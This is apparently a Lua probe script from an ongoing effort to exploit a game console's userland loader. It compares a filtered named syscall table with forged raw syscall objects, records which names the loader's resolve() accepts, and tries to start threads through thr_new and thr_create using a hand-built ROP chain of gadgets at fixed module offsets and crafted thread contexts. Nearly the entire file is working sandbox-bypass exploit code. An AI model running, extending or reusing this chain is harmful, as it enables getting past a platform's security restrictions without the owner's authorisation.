-- CRASH_CLASS: LOW
-- PROBE 1341a2: the loader's named syscall table versus make_syscall(N), revised
--
-- prior art:
--   results/phase35_dead_end_reruns/1341a_resolve_vs_raw_20261109_095129.txt
--       (first revision; its raw thread cases never ran because the syscall
--        objects are callable TABLES, not functions, so the type guard skipped
--        them, and its named-path check had the same bug)
--   docs/DEAD_ENDS.md  "Threading via resolve() - fork/rfork/thr_new all -1"
--   .local/loader_syscall.lua: resolve(list) installs
--       syscall[name] = fcall(syscall.syscall_address, num) with no filter
--   probes/phase11_network_attacks/46d_socket_bypass.lua
--       (results/46d_socket_bypass_20261016_194839.txt: named syscall.socket()
--        returns fds, so a named entry is a caller of the same libkernel stub)
--   probes/phase17_new_vectors/156c_thr_create_correct_offsets.lua,
--       156d_thr_create_child_executes.lua (verified context + offsets)
--   probes/phase21_next_vectors/396f_pop_r8_verify.lua (verified gadget chain)
--
-- 1341a measured: the console's table carries 26 names and none of fork, rfork,
-- thr_new or thr_create; resolve({thr_new=455}) returned without installing the
-- name. This revision fixes the callable-table guard so the raw thread cases
-- actually execute, and adds a resolve() accept/refuse matrix over name+number
-- pairs to show whether the refusal is by name or by number.

print("=== PROBE 1341a2: NAMED SYSCALL TABLE VS make_syscall (revised) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end
    return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end
    return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end
local function hexq(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X_%08X", v.h, v.l)
    end
    local n = N(v)
    if n < 0 then return "-0x" .. string.format("%X", -n) end
    return string.format("0x%X", n)
end
local function s64(v)
    local h, l
    if type(v) == "table" and v.h then
        h, l = v.h, v.l
    else
        local n = N(v)
        if n < 0 then return n end
        h = math.floor(n / 4294967296) % 4294967296
        l = n % 4294967296
    end
    if h >= 2147483648 then return l + (h - 4294967296) * 4294967296 end
    return h * 4294967296 + l
end
local function show(tag, ok, rv)
    if not ok then
        print(string.format("  %-26s RAISED (%s)", tag, tostring(rv)))
    elseif type(rv) == "table" or type(rv) == "number" or type(rv) == "userdata" then
        print(string.format("  %-26s %-4d %s", tag, s64(rv), hexq(rv)))
    else
        print(string.format("  %-26s %s", tag, tostring(rv)))
    end
end
local function kind(v)
    if v == nil then return "nil" end
    return type(v)
end

local stab = syscall
if stab == nil then print("[0] syscall table absent; aborting") return end
local stub = nil
pcall(function() stub = syscall.pipe.fn_addr end)
local pid0 = 0
pcall(function() pid0 = N(mk(20)()) end)
print(string.format("pid=%d  stub=%s", pid0, tostring(stub)))

-- ------------------------------------------------------------------
-- 1) fork(2) and rfork(251) - identical arguments on both paths
-- ------------------------------------------------------------------
print("")
print("[1] fork(2) and rfork(251), identical arguments on both paths")
-- pcall returns (ok, value); rebuild the pair for show()
local function call(what, f, ...)
    if f == nil then
        print(string.format("  %-26s absent from the table", what))
        return nil, false
    end
    local ok, rv = pcall(f, ...)
    show(what, ok, rv)
    return rv, ok
end

call("getpid raw", mk(20))
call("getpid named", stab.getpid)
call("fork raw", mk(2))
call("fork named", stab.fork)
call("rfork raw", mk(251), uint64(0))
call("rfork named", stab.rfork, uint64(0))

-- ------------------------------------------------------------------
-- 2) what resolve() will and will not install
-- ------------------------------------------------------------------
print("")
print("[2] resolve() accept/refuse matrix (type before -> after)")
local resolve = stab.resolve
if resolve == nil then
    print("  resolve absent")
else
    local tries = {
        { "zzz20", 20 }, { "getpid", 20 }, { "thr_exit", 431 },
        { "msync", 65 }, { "kenv", 390 }, { "kldstat", 308 },
        { "thr_new", 455 }, { "thr_create", 430 },
    }
    for _, t in ipairs(tries) do
        local name, num = t[1], t[2]
        local before = kind(stab[name])
        local ok, rv = pcall(function() return resolve({ [name] = num }) end)
        print(string.format("  %-12s num=%-4d %-8s -> %-8s resolve ok=%s rv=%s",
            name, num, before, kind(stab[name]), tostring(ok), tostring(rv)))
    end
end

-- ------------------------------------------------------------------
-- 3) thr_new(455) - chain: sysarch(SET_FSBASE) then thr_exit(0)
-- ------------------------------------------------------------------
print("")
print("[3] thr_new(455)")
local info = memory.alloc(0x200)
zero(info, 0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local eb_lo = rd(N(info) + 0x108) or 0
local eb_hi = rd(N(info) + 0x10C) or 0
if eb_lo == 0 or stub == nil then
print("[3] no module base or no syscall stub; skipping thread cases")
else
print(string.format("  eb=%X_%08X", eb_hi, eb_lo))
local function g(off) return uint64(string.format("0x%X%08X", eb_hi, eb_lo + off)) end
local pop_rax_ret = g(0x992)
local pop_rdi_ret = g(0xC9DFE)
local pop_rsi_ret = g(0xD77D)
local pop_rdx_ret = g(0x3B02D7)
local pop_rcx_ret = g(0xE64)

local tcb_buf = memory.alloc(0x10000)
zero(tcb_buf, 0x10000)
local tcb_mid = N(tcb_buf) + 0x8000
wd(tcb_mid, tcb_mid % 0x100000000)
wd(tcb_mid + 4, math.floor(tcb_mid / 0x100000000))
local tcb_ptr = memory.alloc(8)
wq(tcb_ptr, uint64(tcb_mid))

local function write_chain(rsp)
    local sp = rsp
    local function push(v) wq(sp, v); sp = sp + 8 end
    push(uint64(165))
    push(pop_rdi_ret); push(uint64(129))
    push(pop_rsi_ret); push(uint64(N(tcb_ptr)))
    push(pop_rdx_ret); push(uint64(0))
    push(pop_rcx_ret); push(uint64(0))
    push(stub)
    push(uint64(431))
    push(pop_rdi_ret); push(uint64(0))
    push(stub)
    return sp
end

local stk = memory.alloc(0x10000)
zero(stk, 0x10000)
local stk_base = N(stk)
local nominal = 0x100
local rsp = ((stk_base + nominal) - ((stk_base + nominal) % 16)) - 8
write_chain(rsp)

local pa = memory.alloc(0x38)
zero(pa, 0x38)
local tidp = memory.alloc(8)
wq(pa + 0x00, pop_rax_ret)
wq(pa + 0x08, uint64(0))
wq(pa + 0x10, uint64(stk_base))
wq(pa + 0x18, uint64(nominal))
wq(pa + 0x30, uint64(N(tidp)))
print(string.format("  param=%X start_func=%s stack=%X+%X",
    N(pa), hexq(pop_rax_ret), stk_base, nominal))

local function thr_new_call(tag, f)
    if f == nil then
        print(string.format("  %-26s absent from the table", tag))
        return
    end
    wq(tidp, uint64(0xDEADDEAD))
    local ok, rv = pcall(f, uint64(N(pa)), uint64(0x38))
    show(tag, ok, rv)
    print(string.format("  %-26s child_tid=%s", tag .. " tid", hexq(rq(tidp))))
end
thr_new_call("thr_new raw", mk(455))
thr_new_call("thr_new named", stab.thr_new)

-- ------------------------------------------------------------------
-- 4) thr_create(430) - the 156c context, child exits via thr_exit
-- ------------------------------------------------------------------
print("")
print("[4] thr_create(430)")
local stk2 = memory.alloc(0x10000)
zero(stk2, 0x10000)
local stk2_base = N(stk2)
local ctx_rsp = stk2_base + 0x8000
write_chain(ctx_rsp)

local ctx = memory.alloc(0x500)
zero(ctx, 0x500)
wq(ctx + 0x108, uint64(0x480))
wd(ctx + 0x0D0, 0)
wq(ctx + 0x110, uint64(0x10000))
wq(ctx + 0x0C0, uint64(0x43))
wq(ctx + 0x0E0, pop_rax_ret)
wq(ctx + 0x0F8, uint64(ctx_rsp))
wq(ctx + 0x100, uint64(0x3B))
local tid2 = memory.alloc(8)
print(string.format("  ctx=%X rsp=%X", N(ctx), ctx_rsp))

local function thr_create_call(tag, f)
    if f == nil then
        print(string.format("  %-26s absent from the table", tag))
        return
    end
    wq(tid2, uint64(0xDEADDEAD))
    local ok, rv = pcall(f, uint64(N(ctx)), uint64(N(tid2)), uint64(0))
    show(tag, ok, rv)
    print(string.format("  %-26s tid=%s", tag .. " tid", hexq(rq(tid2))))
end
thr_create_call("thr_create raw", mk(430))
thr_create_call("thr_create named", stab.thr_create)

local ts = memory.alloc(16)
wq(ts, uint64(0))
wq(ts + 8, uint64(200000000))
pcall(function() mk(240)(uint64(N(ts)), uint64(0)) end)
local okc, pidc = pcall(function() return N(mk(20)()) end)
print(string.format("  canary after 200ms: ok=%s pid=%s (was %d)", tostring(okc), tostring(pidc), pid0))
end

print("")
print("=== PROBE 1341a2 COMPLETE ===")
